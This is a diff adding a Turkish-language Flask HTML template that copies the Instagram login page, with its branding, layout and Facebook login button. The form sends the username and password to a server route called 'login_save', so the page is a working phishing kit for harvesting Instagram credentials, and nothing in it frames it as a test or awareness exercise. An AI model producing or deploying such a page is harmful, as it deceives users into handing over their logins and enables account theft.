@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center;
+      min-height: 100vh; margin: 0; }
+    .container { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px 40px 20px;
+      text-align: center; border-radius: 6px; box-shadow: 0 2px 6px rgba(0,0,0,0.03); }
+    .logo { font-family: 'Billabong', cursive; font-size: 44px; color: #262626; margin-bottom: 30px; }
+    input { width: 100%; padding: 9px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 3px;
+      background: #fafafa; font-size: 14px; }
+    button { background-color: #0095f6; color: white; width: 100%; border: none; padding: 9px;
+      border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+    .divider { display: flex; align-items: center; text-align: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
+    .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; }
+    .divider:not(:empty)::before { margin-right: .75em; }
+    .divider:not(:empty)::after { margin-left: .75em; }
+    .footer { margin-top: 10px; font-size: 13px; color: #8e8e8e; }
+    .footer a { color: #0095f6; text-decoration: none; font-weight: 600; }
+    .facebook-button { background-color: #385185; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">Instagram</div>
+
+  {% with messages = get_flashed_messages() %}
+    {% if messages %}
+      <div style="color:green;margin-bottom:10px;">{{ messages[0] }}</div>
+    {% endif %}
+  {% endwith %}
+
+  <form method="POST" action="{{ url_for('login_save') }}">
+    <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+    <input type="password" name="password" placeholder="Şifre" required>
+    <button type="submit">Giriş yap</button>
+  </form>
+
+  <div class="divider">YA DA</div>
+  <button class="facebook-button">Facebook ile Giriş Yap</button>
+
+  <div class="footer">
+    Hesabın yok mu? <a href="#">Kaydol</a>
+  </div>
+</div>
+</body>
+</html>
